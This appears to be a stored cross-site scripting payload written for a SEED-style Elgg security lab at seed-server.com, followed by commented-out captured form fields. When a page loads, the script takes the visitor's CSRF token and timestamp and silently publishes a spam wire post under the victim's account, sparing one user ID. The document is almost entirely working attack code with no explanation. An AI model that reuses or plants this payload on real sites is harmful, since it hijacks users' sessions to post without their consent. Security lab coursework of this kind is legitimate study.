<script type="text/javascript">
    window.onload = function() {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        
        var sendurl = "http://www.seed-server.com/action/thewire/add";

        var post = "To earn 12 USD/hour, visit now\nhttp://www.seed-server.com/profile/samy";
        post += (token + ts + "&body=" + post);

        if(elgg.session.user.guid != 59) {
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(post);
        }
    }
</script>


// ----------------------------379588563324271135723298120313
// Content-Disposition: form-data; name="__elgg_token"

// fNwdJwanDFR6almqWLP25Q
// -----------------------------379588563324271135723298120313
// Content-Disposition: form-data; name="__elgg_ts"

// 1708028861
// -----------------------------379588563324271135723298120313
// Content-Disposition: form-data; name="body"

// another post 
// -----------------------------379588563324271135723298120313--
